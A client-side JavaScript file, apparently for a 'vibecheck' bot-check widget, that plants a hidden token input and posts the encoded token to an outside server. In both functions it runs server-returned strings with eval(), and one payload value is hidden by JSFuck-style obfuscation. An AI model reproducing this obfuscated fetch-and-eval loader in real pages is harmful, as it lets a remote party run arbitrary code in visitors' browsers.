const thisScript = document.currentScript;

async function s() {
    setTimeout(async () => {
        window.md = undefined;
        let nextEl = thisScript.nextElementSibling;

        while (nextEl) {
            if (nextEl.tagName === 'DIV' && nextEl.classList.contains('vibecheck-result')) {
                window.md = nextEl;
                break;
            }
            nextEl = nextEl.nextElementSibling;
        }

        if (!window.md) {
            console.warn("Failed to locate injection div. Using current script location instead.");
            let newDiv = document.createElement("div");
            newDiv.classList.add("vibecheck-result");
            thisScript.insertAdjacentElement('afterend', newDiv);
            window.md = newDiv;
        }

        window.md.innerHTML = `<input type='hidden' value='nct.9381f86b08b3ec76cc028e0dd8cfbb47347d54db18264992018af9abbaec4a647c080326df36e5be' name='vibecheck-result-token' />`;

        async function postData(url = '', data = {}) {
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                return await response.json();
            } catch (error) {
                console.error('Error:', error);
            }
        }

        const payload = {
            "e": -381,
            "ed": btoa(JSON.stringify({
                "mft": window.md.getElementsByTagName("input")[0].value,
                "a": "atavoart"
            }))
        };

        const tpd = await postData(
            'https://vibecheck.petar.petrushev.u.is-my.space/api/eh/',
            payload
        );

        if (tpd && tpd.ag) {
            if (tpd.se) {
                try {
                    eval(tpd.cte);
                } catch (e) {
                    console.error("Something went wrong during the check. " + e);
                }
            }
        }
    }, 20);
}

s();

async function smt(ts) {

    async function postData(url = '', data = {}) {
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            return await response.json();
        } catch (error) {
            console.error('Error:', error);
        }
    }

    const payload = {
        "e": -381 + (((+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[])+(+!![]+[])+(+!![]+[])+(+!![]+[])+(+!![]+[])+(+!![]+[])+(+!![]+[])+(+!![]+[])+(+!![]+[]))-(-1*-90000000990)-(-80888888888)+(1*8*82+332+5)-3)*(~[].length))*-1*5,
        "ed": btoa(JSON.stringify({
            "mft": window.nmd.getElementsByTagName("input")[0].value,
            "a": "gmttiweasb"
        }))
    };

    const ttd = await postData(
        'https://vibecheck.petar.petrushev.u.is-my.space/api/eh/',
        payload
    );

    try {
        if (ttd.ag) {
            eval(ttd.ett)
        }
    } catch (e) {
        console.error("Something went wrong. " + e)
    }
}
